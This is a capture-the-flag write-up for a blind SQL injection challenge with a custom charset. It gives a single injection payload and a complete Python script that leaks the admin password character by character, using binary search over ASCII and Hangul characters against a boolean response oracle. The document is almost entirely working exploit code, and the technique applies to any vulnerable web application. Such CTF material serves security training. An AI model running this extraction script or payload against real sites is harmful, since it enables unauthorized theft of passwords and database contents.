# blind sql injection advanced
This challenge involves blind sql injection with a custom charset

# Solve
i use this payload to check each character, using binary search
```
http://chall.site/?uid=admin' AND SUBSTRING(upw,12,1)='}'-- 
```

# Solve script
binary search for flag:
```python
import requests
import string

url = "http://chall.site/?uid="

ascii_chars = ''.join(chr(i) for i in range(128))
hangul = ''.join(chr(i) for i in range(0xAC00, 0xD7A4))
charset = ascii_chars + hangul
charset = ''.join(sorted(set(charset)))

password = "DH{이것이비밀번호"
max_len = 30

for i in range(11, max_len + 1):
    low, high = 0, len(charset) - 1
    
    while low < high:
        mid = (low + high) // 2
        test_char = charset[mid]
        payload = f"admin' AND SUBSTRING(upw,{i},1)>'{test_char}'-- "
        r = requests.get(url + payload)
        if "exists." in r.text:
            low = mid + 1
        else:
            high = mid

    candidate = charset[low]
    # verify equality
    eq_payload = f"admin' AND SUBSTRING(upw,{i},1)='{candidate}'-- "
    r = requests.get(url + eq_payload)
    if "exists." in r.text:
        password += candidate
        print(f"Found character {i}: {candidate} -> {password}")
        if candidate == '}':
            break
    else:
        print(f"No character found at position {i}, stopping.")
        break

print(f"Extracted: {password}")
``` 
